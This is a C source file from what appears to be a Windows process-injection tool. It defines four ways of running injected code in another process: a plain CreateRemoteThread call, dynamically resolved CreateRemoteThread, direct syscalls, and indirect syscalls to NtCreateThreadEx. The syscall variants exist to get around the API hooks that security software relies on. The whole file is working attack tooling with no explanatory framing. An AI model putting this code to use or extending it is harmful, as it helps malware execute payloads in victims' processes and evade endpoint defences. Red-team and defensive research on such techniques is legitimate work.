#include "invoke.h"
#include "resolver.h"
#include "engine.h"

BOOL Win32Invoke(PINJECTION_CONTEXT ctx)
{
    printf("[*] Using Win32 API to invoke CreateRemoteThread.\n");
    HANDLE hThread = CreateRemoteThread(ctx->hProcess,
                                        NULL,
                                        0,
                                        (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
                                        NULL,
                                        0,
                                        NULL);

    ctx->hThread = hThread;
    return (hThread != NULL);
}

BOOL DFRInvoke(PINJECTION_CONTEXT ctx)
{
    if (!g_CreateRemoteThread)
        return FALSE;

    printf("[*] Using DFR to invoke CreateRemoteThread.\n");
    HANDLE hThread = g_CreateRemoteThread(ctx->hProcess,
                                          NULL,
                                          0,
                                          (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
                                          NULL,
                                          0,
                                          NULL);

    ctx->hThread = hThread;
    return (hThread != NULL);
}

BOOL DirectInvoke(PINJECTION_CONTEXT ctx)
{
    printf("[*] Using direct syscalls to invoke tCreateThreadEx.\n");
    NTSTATUS status = SysNtCreateThreadEx(&ctx->hThread,
                                          GENERIC_EXECUTE,
                                          NULL,
                                          ctx->hProcess,
                                          ctx->pRemoteAddress,
                                          NULL,
                                          FALSE,
                                          0,
                                          0,
                                          0,
                                          NULL);

    return (status == 0 && ctx->hThread != NULL);
}

BOOL IndirectInvoke(PINJECTION_CONTEXT ctx)
{
    printf("[*] Using indirect syscalls to invoke tCreateThreadEx.\n");
    NTSTATUS status = IndirectSysNtCreateThreadEx(&ctx->hThread,
                                                  GENERIC_EXECUTE,
                                                  NULL,
                                                  ctx->hProcess,
                                                  ctx->pRemoteAddress,
                                                  NULL,
                                                  FALSE,
                                                  0,
                                                  0,
                                                  0,
                                                  NULL);

    return (status == 0 && ctx->hThread != NULL);
}
